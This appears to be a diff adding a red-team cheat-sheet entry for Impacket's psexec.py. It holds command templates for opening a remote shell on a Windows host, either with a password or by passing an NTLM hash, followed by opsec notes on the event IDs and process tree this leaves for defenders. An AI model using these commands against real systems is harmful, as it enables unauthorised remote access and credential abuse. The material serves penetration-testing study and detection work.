@@ -1,0 +1,21 @@
+# open shell on remote host
+python psexec.py <domain>/<user>:<password>@<rhost>
+
+# using hash (hash must be: lmhash:nthash)
+python psexec.py -hashes:<hash> <domain>/<user>@<rhost>
+
+# opsec considerations
+upload randomly named exe file to C:\Windows
+
+Windows Security Log Event IDs
+-Logon (4624) -> multiple
+-Special Logon (4672) -> multiple
+
+Windows System Logs
+-Service Control Manager (7045)
+
+Running Processes
+gsHtpykm.exe
+└── cmd.exe
+    └── Conhost.exe
+
